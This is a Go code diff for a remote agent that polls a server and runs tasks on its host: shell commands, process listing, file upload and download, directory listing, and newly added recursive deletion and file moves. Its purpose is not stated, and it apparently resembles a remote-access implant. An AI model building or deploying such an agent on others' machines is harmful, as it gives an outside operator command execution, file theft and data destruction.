@@ -44,11 +44,13 @@ var cmdEncoding = charmap.CodePage866
 func longPoll(hwid string) {
 	client := agent.NewClient(baseURL)
 	client.SupportedTaskTypes = map[string]bool{
-		"execute_cmd": true,
-		"proclist":    true,
+		"execute_cmd":  true,
+		"proclist":     true,
 		"downloadfile": true,
-		"uploadfile": true,
-		"dircontents": true,
+		"uploadfile":   true,
+		"dircontents":  true,
+		"deletefile":   true,
+		"movefile":     true,
 	}
 	client.UseAccount(hwid)
 	for {
@@ -58,7 +60,7 @@ func longPoll(hwid string) {
 			if id != -1 {
 				go client.SendTaskResult(id, map[string]interface{}{"error": true, "msg": err.Error()})
 			}
-			time.Sleep(30*time.Second)
+			time.Sleep(30 * time.Second)
 			continue
 		}
 		if id == -1 {
@@ -69,6 +71,7 @@ func longPoll(hwid string) {
 }
 
 func executeTask(client *agent.Client, taskID int, type_ string, body map[string]interface{}) {
+	log.Println("Received task", body)
 	switch type_ {
 	case "execute_cmd":
 		executeCmdTask(client, taskID, body)
@@ -80,7 +83,45 @@ func executeTask(client *agent.Client, taskID int, type_ string, body map[string
 		uploadFileTask(client, taskID, body)
 	case "dircontents":
 		dirContentsTask(client, taskID, body)
+	case "deletefile":
+		deleteFileTask(client, taskID, body)
+	case "movefile":
+		moveFileTask(client, taskID, body)
 	}
+}
+
+func deleteFileTask(client *agent.Client, taskID int, body map[string]interface{}) {
+	path, ok := body["path"].(string)
+	if !ok {
+		client.SendTaskResult(taskID, map[string]interface{}{"error": true, "msg": "path should be string"})
+		return
+	}
+
+	if err := os.RemoveAll(path); err != nil {
+		client.SendTaskResult(taskID, map[string]interface{}{"error": true, "msg": err.Error()})
+		return
+	}
+	client.SendTaskResult(taskID, map[string]interface{}{"error": false})
+}
+
+func moveFileTask(client *agent.Client, taskID int, body map[string]interface{}) {
+	fromPath, ok := body["frompath"].(string)
+	if !ok {
+		client.SendTaskResult(taskID, map[string]interface{}{"error": true, "msg": "frompath should be string"})
+		return
+	}
+	toPath, ok := body["topath"].(string)
+	if !ok {
+		client.SendTaskResult(taskID, map[string]interface{}{"error": true, "msg": "topath should be string"})
+		return
+	}
+
+	if err := os.Rename(fromPath, toPath); err != nil {
+		client.SendTaskResult(taskID, map[string]interface{}{"error": true, "msg": err.Error()})
+		return
+	}
+
+	client.SendTaskResult(taskID, map[string]interface{}{"error": false})
 }
 
 func uploadFileTask(client *agent.Client, taskID int, body map[string]interface{}) {
@@ -106,7 +147,7 @@ func uploadFileTask(client *agent.Client, taskID int, body map[string]interface{
 }
 
 func dirContentsTask(client *agent.Client, taskID int, body map[string]interface{}) {
-	path, ok := body["path"].(string)
+	path, ok := body["dir"].(string)
 	if !ok {
 		client.SendTaskResult(taskID, map[string]interface{}{"error": true, "msg": "path should be string"})
 		return
@@ -121,8 +162,8 @@ func dirContentsTask(client *agent.Client, taskID int, body map[string]interface
 	res := []map[string]interface{}{}
 	for _, entry := range dirInfo {
 		res = append(res, map[string]interface{}{
-			"name": entry.Name(),
-			"dir": entry.IsDir(),
+			"name":     entry.Name(),
+			"dir":      entry.IsDir(),
 			"fullpath": filepath.Join(path, entry.Name()),
 		})
 	}
@@ -147,7 +188,7 @@ func downloadFileTask(client *agent.Client, taskID int, body map[string]interfac
 		return
 	}
 
-	file, err := os.Open(outPath)
+	file, err := os.Create(outPath)
 	if err != nil {
 		client.SendTaskResult(taskID, map[string]interface{}{"error": true, "msg": err.Error()})
 		return
